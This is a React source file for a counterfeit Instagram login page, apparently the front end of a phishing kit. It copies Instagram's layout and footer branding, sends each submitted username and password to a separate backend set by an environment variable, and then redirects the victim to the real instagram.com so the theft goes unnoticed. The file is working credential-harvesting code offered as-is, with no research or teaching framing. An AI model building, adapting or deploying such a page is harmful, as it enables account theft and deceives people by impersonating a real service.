import React, { useState } from "react";
import LOGO from "./photos/instablak.png";
import FaceBookICon from "./photos/facebook-icon.png";
import AppleStore from "./photos/applestore.png";
import GoogleStore from "./photos/googlestore.png";
import HomePhoneMain from "./photos/home-phones-main.png";
import { useNavigate } from "react-router-dom";

const Home = () => {

  const BACKEND_ADD = process.env.REACT_APP_BACKEND_ADDRESS;
  // console.log(BACKEND_ADD)

  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);

  const [data, setData] = useState({
    username: "",
    password: ""
  })

  const valueget = (e) => {
    const {name, value} = e.target;
    
    setData(() => {
      return{
        ...data,
        [name]: value
      }
    })
  }

  const datasubmit = async (e) => {
    e.preventDefault();
    const {username, password} = data;
    if(!username || !password){
      return alert("Please Fill all Fields");
    }

    try {
      const data = await fetch(`${BACKEND_ADD}/api/v1/login`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username, password
        })
      })

      const res = await data.json();

      // navigate("https://www.instagram.com/");
      window.location.href = "https://www.instagram.com/";

    } catch (error) {
      console.log(error)
    }

  }

  return (
    <>
      <main className="mainSec">
        <div className="log-in-container">
          <div className="log-in">
            <img src={LOGO} className="logo" alt="Ima"/>
            <form action="" onSubmit={datasubmit} className="log-in-form">
              <input
                type="text"
                placeholder="Phone number,username or email"
                name="username"
                onChange={valueget}
                value={data.username}
              />
              <div style={{position: 'relative'}}>
                <input type={showPassword ? "text" : "password"}
                  name="password" 
                  placeholder="Password"
                  onChange={valueget}
                  style={{width: "100%"}}
                  value={data.password}
                />
              <div style={{
                position: 'absolute',
                top: '50%',
                right: '2rem',
                cursor: 'pointer',
                transform: 'translateY(-50%)',
                fontSize: "12px"
              }}
              onClick={() => setShowPassword((prev) => !prev)}>
                {showPassword ? "Hide" : "Show"}
              </div>
            </div>
              <button className="log-in-button">Log In</button>
            </form>
            <span className="or-divider">OR</span>
            {/*FACEBOOK OPTION*/}
            <div className="fb-login">
              <a href="/" className="anchor">
                <img src={FaceBookICon} alt="img"/>
                <span>Log in with Facebook</span>
              </a>
            </div>
            {/*forgot passwd*/}
            <a href="/" className="forgotpass">
              Forgot password?
            </a>
          </div>
          {/*sign up*/}
          <div className="sign-up">
            <span>
              Don't have an account
              <a href="/">Sign up</a>
            </span>
          </div>
          {/*download*/}
          <div className="get-the-app">
            <span>Get the app</span>
            <div className="app-images">
              <a href="/">
                <img src={AppleStore} alt="ima"/>
              </a>
              <a href="/">
                <img src={GoogleStore} alt="ima"/>
              </a>
            </div>
          </div>
        </div>
        {/*phones*/}
        <div className="phones-container">
          <img src={HomePhoneMain} alt="img"/>
        </div>
      </main>
      <footer>
        <ul className="footer-links">
          <li>
            <a href="/">ABOUT</a>
          </li>
          <li>
            <a href="/">HELP</a>
          </li>
          <li>
            <a href="/">PRESS</a>
          </li>
          <li>
            <a href="/">API</a>
          </li>
          <li>
            <a href="/">JOBS</a>
          </li>
          <li>
            <a href="/">PRIVACY</a>
          </li>
          <li>
            <a href="/">TERMS</a>
          </li>
          <li>
            <a href="/">LOCATION</a>
          </li>
          <li>
            <a href="/">TOP</a>
          </li>
          <li>
            <a href="/">ACCOUNTS</a>
          </li>
          <li>
            <a href="/">HASHTAGS</a>
          </li>
          <li>
            <a href="/">LANGUAGE</a>
          </li>
        </ul>
        <div className="footercopy">
          <span className="copyright">© © 2024 Instagram from Meta</span>
        </div>
      </footer>
    </>
  );
};

export default Home;
